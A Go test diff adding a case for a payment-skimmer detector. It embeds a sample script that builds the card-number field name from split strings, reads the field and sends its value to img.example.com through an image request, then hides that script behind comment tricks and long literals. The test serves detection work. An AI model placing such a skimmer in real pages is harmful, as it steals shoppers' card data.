@@ -252,3 +252,26 @@ func TestSkimmerAfterUncertainBrackets(t *testing.T) {
 		t.Error("template across pieces: not found")
 	}
 }
+
+// The forms of comment a browser's script reads, every line terminator, and literals longer than
+// what the folding keeps are passed over as JavaScript does: none of them makes the tokenizer read
+// a comment or a literal as code, nor code as a comment.
+func TestSkimmerAcrossCommentsAndLongLiterals(t *testing.T) {
+	skim := `var s='payment[c'+'c_n'+'umber]';var f=document.querySelector('[name="'+s+'"]');new Image().src="https://img.example.com/p?d="+f.value;`
+	x := strings.Repeat("x", maxLiteral+100)
+	for name, src := range map[string]string{
+		"html open comment":       "var a=1;\n<!--/*\n" + skim + "\n//*/\n",
+		"html close comment":      "var a=1;\n-->/*\n" + skim + "\n//*/\n",
+		"hashbang":                "#!/*\n" + skim + "\n//*/\n",
+		"line separator":          "var a=1;//x " + skim + " var b=2;",
+		"paragraph separator":     "var a=1;//x " + skim + " var b=2;",
+		"carriage return":         "var a=1;//x\r" + skim + "\rvar b=2;",
+		"long string":             "var t='" + x + "/*';" + skim + "var e='*/';",
+		"long template":           "var t=`" + x + "/*`;" + skim + "var e='*/';",
+		"long regular expression": "var t=/" + x + "\\/*/;" + skim + "var e='*/';",
+	} {
+		if skimmerSignals([]byte(src)) == nil {
+			t.Errorf("%s: not found", name)
+		}
+	}
+}
